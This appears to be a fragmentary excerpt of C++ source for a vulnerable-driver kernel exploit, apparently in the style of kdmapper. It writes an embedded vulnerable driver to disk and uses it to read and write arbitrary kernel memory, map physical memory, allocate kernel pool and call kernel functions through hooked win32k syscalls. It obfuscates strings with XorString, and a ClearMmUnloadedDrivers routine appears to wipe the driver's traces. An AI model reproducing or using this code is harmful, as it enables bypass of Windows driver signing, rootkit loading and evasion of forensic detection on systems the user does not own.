...
HANDLE vul_driver::Load()
{
	...
	if (!utilitiesy::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(drv_resource::driver), sizeof(drv_resource::driver)))
	{
		return nullptr;
	}
...
void vul_driver::Unload(HANDLE device_handle)
{
	BlockInput(TRUE);
...
bool vul_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
{
...
bool vul_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
{
	if (!address || !size)
		return 0;
...
bool vul_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address)
{
	if (!address)
		return 0;
...
uint64_t vul_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size)
{
...
bool vul_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size)
{
	if (!address || !size)
		return false;
...
bool vul_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool vul_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool vul_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
...
uint64_t vul_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	if (!size)
		return 0;
	...
	if (!kernel_ExAllocatePool)
		kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utilitiesy::GetKernelModuleAddress(XorString("ntoskrnl.exe")), XorString("ExAllocatePool"));
...
bool vul_driver::FreePool(HANDLE device_handle, uint64_t address)
{
	if (!address)
		return 0;
	...
	if (!kernel_ExFreePool)
		kernel_ExFreePool = GetKernelModuleExport(device_handle, utilitiesy::GetKernelModuleAddress(XorString("ntoskrnl.exe")), XorString("ExFreePool"));

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t vul_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name)
{
...
bool vul_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint64_t* out_kernel_original_function_address)
{
	...
	{
		const uint64_t kernel_NtGdiDdDDIReclaimAllocations2 = GetKernelModuleExport(device_handle, utilitiesy::GetKernelModuleAddress(XorString("win32kbase.sys")), XorString("NtGdiDdDDIReclaimAllocations2"));
...
bool vul_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint8_t* out_kernel_original_bytes)
{
	static uint64_t kernel_function_ptr = 0;
	...
	{
		const uint64_t kernel_NtGdiGetCOPPCompatibleOPMInformation = GetKernelModuleExport(device_handle, utilitiesy::GetKernelModuleAddress(XorString("win32kfull.sys")), XorString("NtGdiGetCOPPCompatibleOPMInformation"));
	...
	*out_kernel_function_ptr = kernel_function_ptr;
	std::memcpy(out_kernel_original_bytes, kernel_original_jmp_bytes, sizeof(kernel_original_jmp_bytes));

	return true;
}

bool vul_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	ULONG buffer_size = 0;
	void* buffer = nullptr;
